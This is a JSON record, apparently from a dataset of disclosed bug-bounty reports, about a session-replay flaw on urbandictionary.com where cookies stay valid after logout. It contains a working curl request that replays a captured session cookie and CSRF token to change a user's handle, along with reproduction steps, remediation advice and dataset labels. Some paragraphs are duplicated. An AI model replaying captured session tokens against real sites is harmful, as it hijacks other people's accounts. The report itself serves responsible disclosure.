{
    "reported_to": "Urban Dictionary",
    "reported_by": "tcpiplab ",
    "title": "Session replay vulnerability in www.urbandictionary.com",
    "content": "\nSession replay vulnerability in www.urbandictionary.com\nI considered titling this bug \"Session tokens not expiring\", which is what you need to tell your development team. But I titled it as I did to emphasize at least one attack made possible by the bug. There may be others.\nDescription\nPrivileged functions, e.g., /handle.save.php can still be used after the user has clicked the \"sign out\" link. The cause of the vulnerability seems to be that the server is not invalidating session cookies when the user \"signs out\". I observed session tokens remaining valid even 72 hours after being issued.\nExploitation requires the anti-CSRF authenticity_token from the privileged page from before the victim \"logged out\", and any one of the victim's _rails_session cookies from before the victim \"logged out\". Note that because the server issues a new cookie with each Response, the attacker may choose from among many cookies.\nImpact\nCookies that never expire can impact the security of the user:\nThe user's session is susceptible to hijacking or replay.\nThe user has no way of causing the application to invalidate their session. This is important in shared computing environments.\nThe user's session is susceptible to hijacking or replay.\nThe user has no way of causing the application to invalidate their session. This is important in shared computing environments.\nCookies that never expire can impact the security of the server:\nThe time window to brute-force a valid session token is increased.\nIf many session tokens remain valid, brute-forcing has that many more chances to guess correctly.\nThe time window to brute-force a valid session token is increased.\nIf many session tokens remain valid, brute-forcing has that many more chances to guess correctly.\nStep-by-step Reproduction Instructions\nSet up an HTTP intercept proxy like Burp Suite or ZAP.\nAuthenticate to http://www.urbandictionary.com/users.php via the Gmail OAuth function, receiving a valid session cookie from www.urbandictionary.com, and then \"sign out\" by clicking http://www.urbandictionary.com/auth/logout.\n$ curl -L -i -s -k  -X $'POST'     -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H $'Referer: https://www.urbandictionary.com/handle.php' -H $'Content-Type: application/x-www-form-urlencoded'     -b $'_rails_session=bnBaYnJjSjNJcmxGN1JrWjFkbmUwa0NFY05GdThtcmtHQU0zTHhsem1iQngyQmhvYUdKQTRCVmNHNlBGRTEvRm9aczFwRXc5ekVUV2FEVDM4RSswQU9rejBReGc1M3dxVGhRV0REQmFCUWFkYWcwQ1RhV2NIN1VUalQyM09tNHAwS3lkc0JaRlJqNkxKd2xNZVdKQzhYOFpBdlhqRHhoYVplWmczTFZBL3hlb3E2YUxkVmp4NEkzZUxtZXBQa1ozME9MUFdXRHRDQStOWXdUT2xkcTRSdz09LS1LNXVZWmFBL0F5STRIUjkwTmdnczR3PT0%3D--4ea5f8f5d73379881a6db43b9b8cdcc9d7c89773'     --data-binary $'authenticity_token=C4EmquHAIijNq8UrFfbdfm%2B3Bp5RxvL1BpzMdf3%2FJgtw%2FSn%2FgTt4AlFlIDWFivaesfXJFgNqrWS8DD85obbnpA%3D%3D&user%5Bhandle%5D=H.H.+Vong&commit=Save'     $'https://www.urbandictionary.com/handle.save.php'\nThe authenticity_token from the privileged page from before the user \"logged out\".\nAny one of the user's _rails_session cookies from before the user \"logged out\".\nIn the body of the POST set user[handle] to a new value. I've used H.H. Vong.\nIn the body of the POST set commit to Save.\n<title>Urban Dictionary: Hello H.H. Vong</title>\n\nSuggested Mitigation/Remediation Actions\nConfigure the server side application to invalidate a user's submitted session token:\nWhen a new token is issued by the server side application, so that only one token is valid at any given time.\nWhen the user submits a valid session token to /auth/logout.\nWhen a valid session token has not been submitted to the server side application for greater than n seconds where n is some value consistent with your own internal policy.\nWhen a valid session token, stored on the server, is older than m seconds, where m is the maximum age allowed for a session cookie, based on your own internal policy.\nWhen a new token is issued by the server side application, so that only one token is valid at any given time.\nWhen the user submits a valid session token to /auth/logout.\nWhen a valid session token has not been submitted to the server side application for greater than n seconds where n is some value consistent with your own internal policy.\nWhen a valid session token, stored on the server, is older than m seconds, where m is the maximum age allowed for a session cookie, based on your own internal policy.\nProduct, Version, and Configuration\nKali Linux 2016.2\nMozilla Firefox 45.7.0\nBurp Suite 1.7.17\ncurl 7.52.1\nPlease let me know if you need more information about this issue. Thanks.\n\n",
    "severity": [
        8.8,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Insufficient Session Expiration"
    ],
    "screenshots": {},
    "disclosed_date": 1497961200,
    "report_url": "https://hackerone.com/reports/216294",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Set up an HTTP intercept proxy like Burp Suite or ZAP."
        ],
        [
            2,
            "Authenticate to http://www.urbandictionary.com/users.php via the Gmail OAuth function, receiving a valid session cookie from www.urbandictionary.com, and then 'sign out' by clicking http://www.urbandictionary.com/auth/logout."
        ],
        [
            3,
            "Use curl to send a POST request with the victim's session cookie and authenticity_token to https://www.urbandictionary.com/handle.save.php, modifying the user[handle] parameter."
        ]
    ],
    "vuln_description": "Session replay vulnerability in www.urbandictionary.com where session tokens do not expire upon logout, allowing an attacker to reuse old session tokens and authenticity tokens to perform privileged actions even after the user has signed out.",
    "reason": "The vulnerability involves understanding session management and token reuse, but the steps to exploit it are straightforward once the tokens are captured. The main complexity lies in capturing the session cookie and authenticity token, which is a common practice in session hijacking attacks.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}